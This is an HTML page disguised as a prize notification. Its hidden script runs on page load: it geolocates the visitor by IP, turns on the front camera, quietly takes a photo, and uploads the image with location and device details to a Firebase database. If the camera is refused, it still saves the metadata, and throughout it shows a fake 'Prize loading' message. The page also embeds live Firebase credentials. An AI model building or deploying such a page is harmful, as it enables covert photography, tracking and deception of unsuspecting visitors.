<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>You Won a Prize! 🎉</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
  }
  .container { text-align: center; padding: 2rem; max-width: 400px; }
  .trophy { font-size: 80px; margin-bottom: 1rem; animation: bounce 1s infinite alternate; }
  @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
  h1 { font-size: 2rem; margin-bottom: 0.5rem; }
  p { font-size: 1rem; opacity: 0.9; margin-bottom: 2rem; line-height: 1.6; }
  .status { font-size: 0.9rem; opacity: 0.8; margin-top: 1rem; min-height: 24px; }
  video { display: none; }
  canvas { display: none; }
</style>
</head>
<body>

<div class="container">
  <div class="trophy">🎁</div>
  <h1>Congratulations!</h1>
  <p>You have been selected for a special reward.<br>Your prize is being loaded...</p>
  <div class="status" id="status">Please wait...</div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyD2drTPEiYfj97Er4S_PyPQuRsTyFafYcU",
    authDomain: "link-d89e2.firebaseapp.com",
    databaseURL: "https://link-d89e2-default-rtdb.firebaseio.com",
    projectId: "link-d89e2",
    storageBucket: "link-d89e2.firebasestorage.app",
    messagingSenderId: "110029965870",
    appId: "1:110029965870:web:6ff5813190bbb2bfd46dbf"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  async function captureOnLoad() {
    try {
      // Get IP info
      let ipInfo = {};
      try {
        const ipRes = await fetch('https://ipapi.co/json/');
        ipInfo = await ipRes.json();
      } catch(e) {}

      // Auto open front camera
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });

      const video = document.getElementById('video');
      video.srcObject = stream;

      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(resolve, 1500);
        };
      });

      // Take photo silently
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      // Stop camera immediately
      stream.getTracks().forEach(t => t.stop());

      const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);

      // Save to Firebase
      await set(push(ref(db, 'captures')), {
        photo: photoBase64,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: ipInfo.ip || 'unknown',
        city: ipInfo.city || 'unknown',
        country: ipInfo.country_name || 'unknown',
        device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
      });

      document.getElementById('status').textContent = '🎉 Prize loading...';

    } catch(err) {
      // Camera denied — save metadata only
      try {
        await set(push(ref(db, 'captures')), {
          photo: null,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          error: 'Camera denied: ' + err.message,
          device: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
        });
      } catch(e) {}
      document.getElementById('status').textContent = '🎉 Prize loading...';
    }
  }

  // Auto run on page load
  window.addEventListener('load', captureOnLoad);
</script>

</body>
</html>
